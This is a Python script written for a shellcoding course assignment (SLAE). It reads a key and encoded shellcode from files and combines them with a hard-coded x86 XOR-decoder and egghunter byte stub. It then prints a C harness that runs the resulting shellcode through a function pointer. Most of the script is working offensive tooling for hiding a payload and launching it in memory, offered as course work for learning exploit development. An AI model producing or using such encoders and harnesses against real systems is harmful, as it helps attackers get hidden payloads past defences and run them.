#!/usr/bin/python3.5
# Student ID:SLAE-860
# Assignment 4
#
import argparse
from pprint import pprint

# Yield a certain number of bytes from a file
def get_bytes_from_file(filename, chunksize=1):
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(chunksize)
            if chunk:
                for b in chunk:
                    yield b
            else:
                break
# Return a list with each delimiter+byte in string form
def get_hex_string(delimiter, filename):
    stringified_bytes = []
    # Get actual hex values in string format.  Designed for one byte at a time
    for b in get_bytes_from_file(filename):
        hex_byte_val = delimiter + "{0:02x}".format(b)
        stringified_bytes.append(hex_byte_val)
    return stringified_bytes

def create_decoder_shellcode(egg, encoded_bytes):
    start = r'\x31\xd2\x31\xc9\xfc\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8'

    end = r'\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xeb\x15\x5e\x31\xc9\xb1\x19\x31\xdb\x31\xc0\x8d\x1f\x8a\x03\x30\x06\x46' \
          r'\x43\xe2\xf8\xeb\x05\xe8\xe6\xff\xff\xff'
    enc_shellcode = r''.join(encoded_bytes)
    output = start + egg + end + enc_shellcode
    return output


output_formats = {'asm': r'0x', 'c': r"\x"}
files = ('key.hex', 'enc.hex', 'raw.hex')
byte_string_dict = {}

parser = argparse.ArgumentParser()
parser.add_argument('-e',
                    action="store",
                    dest="egg",
                    required=True,
                    help='Specify four hex characters to represent egg bytes, example:  1b2a')
parser.add_argument('-f',
                    action="store",
                    dest="fmt",
                    choices=['asm', 'c'],
                    required=True,
                    help='Specify either c or asm as the output.')

args = parser.parse_args()
delim_char = output_formats[args.fmt]

# Only 4 characters should have been passed, no error checking for invalid characters unfortunately yet.
assert len(args.egg) == 4

# Get a dictionary of the stringified bytes from each file
for file in files:
    byte_string_dict[file] = get_hex_string(delim_char, file)

# Make a copy of the key, then insert the egg at the beginning of the key
eggified_key = byte_string_dict['key.hex'][:]
for i in range(4):
    eggified_key.insert(0, delim_char + args.egg[0:2])
    eggified_key.insert(0, delim_char + args.egg[2:4])

c_header = r"#include<stdio.h>" + '\n' + r"#include<string.h>" + '\n\n'
c_decl_1 = r"unsigned char the_key[] = " + '\\' + '\n' + r'"' + r''.join(eggified_key) + r'";' + '\n\n'

# Puts the egg in the correct byte order for creating the decoder shellcode
byte_order_egg_string = (delim_char + args.egg[2:4] + delim_char + args.egg[0:2]) * 2

# Piece together the decoder/egghunter shellcode bytes from the egg and the encoded shellcode
decoder_shellcode = create_decoder_shellcode(byte_order_egg_string, byte_string_dict['enc.hex'])

c_decl_2 = r"unsigned char code[] = " + '\\' + '\n' + r'"' + decoder_shellcode + r'";' + '\n\n'
c_body = r"main()" + '\n' + '{' + '\n\n' + '\t' + r'printf("Shellcode Length:  %d\n", strlen(code));' + '\n\n' \
         + '\t' + r'int (*ret)() = (int(*)())code;' + '\n\n' + '\t' + 'ret(); \n\n}'

print(c_header + c_decl_1 + c_decl_2 + c_body)


